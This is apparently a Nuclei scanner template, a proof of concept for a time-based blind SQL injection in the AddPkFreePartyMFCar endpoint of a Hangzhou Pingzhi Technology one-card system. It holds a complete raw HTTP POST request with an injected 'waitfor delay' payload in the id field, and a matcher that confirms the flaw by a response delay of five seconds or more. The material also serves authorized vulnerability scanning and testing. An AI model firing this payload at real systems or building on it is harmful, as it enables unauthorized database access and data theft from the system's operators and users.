id: poc-pp36rsp96yh7t8z0
info:
  name: 杭州平治科技一卡通系统 AddPkFreePartyMFCar 存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /ex/AddPkFreePartyMFCar HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36

    Content-Length: 49

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Encoding: gzip, deflate, br

    Accept-Language: zh-CN,zh;q=0.9

    Cache-Control: max-age=0

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    If-Modified-Since: Tue, 04 Apr 2023 09:51:31 GMT

    Upgrade-Insecure-Requests: 1


    id=1'';waitfor delay ''0:0:5''--+&cp=2&uykqtjsc=list'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
